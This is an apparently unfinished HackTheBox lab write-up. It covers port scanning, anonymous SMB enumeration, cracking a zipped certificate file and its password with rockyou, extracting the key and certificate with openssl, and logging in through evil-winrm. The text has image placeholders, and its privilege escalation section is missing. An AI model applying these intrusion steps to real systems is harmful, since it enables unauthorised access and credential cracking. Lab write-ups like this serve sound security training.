# Recon

As usual we start with a port scan against the target:
```
sudo nmap -sV -p- -sC -oN nmap.txt -O 10.10.11.152 -T5
```

<img src="https://raw.githubusercontent.com/vbrunschot/Write-Ups/main/HackTheBox/Celestial/assets/1.png">

From the looks of it we can tell it's a domain controller. Lot's of open ports to investigate.

# Enumeration
Normally a domain controller has great enumeration potential. We can use tools like ```smbclient, enum4linux, smbmap, nbtscan, rpcclient``` and there are numerous ```impacket``` scripts available. ```Msfconsole```.

```
rpcclient -U '' -N 10.10.11.152
help
getusername
enumprivs
```
pic5

unfortunately ```enumdomusers``` is not allowed. At this point is just trial and error running different commands. Let's leave it for now.

After doing some more enumeration we find a share at ```Shares``` containing some files. 

# Initial Foothold
smbclient -N -L //10.10.11.152/
pic 2


7z l -slt winrm_backup.zip
pic 3

fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt winrm_backup.zip
pic 4

unzip winrm_backup.zip
legacyy_dev_auth.pfx

I had to update ```john``` in order to have ```pfx2john``` available
and run the following command to create a suitable hash for ```john```
```
pfx2john legacy_dev_auth.pfx > hash
```
And pass it along to john:
john --wordlist=/usr/share/wordlists/rockyou.txt hash    
pic6

We have cracked the password using the rockyou wordlist. I found [documentation](https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file) how one could extract the private key and certificate from a pfx file.

Extract the private key:
```
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacy.key -nodes  
``` 
pic 7

And we do the same to extract the certificate:
```
openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacy.crt 
```

After this we alter the files by removing the header so we are only left with the key itself. We can now continue by using the keys to connect to the target with ```evilwin-rm``` .
````
evil-winrm -S -k legacy.key -c legacy.crt -i 10.10.11.152
```

# Privilege Escalation
[TO BE CONTINUED]






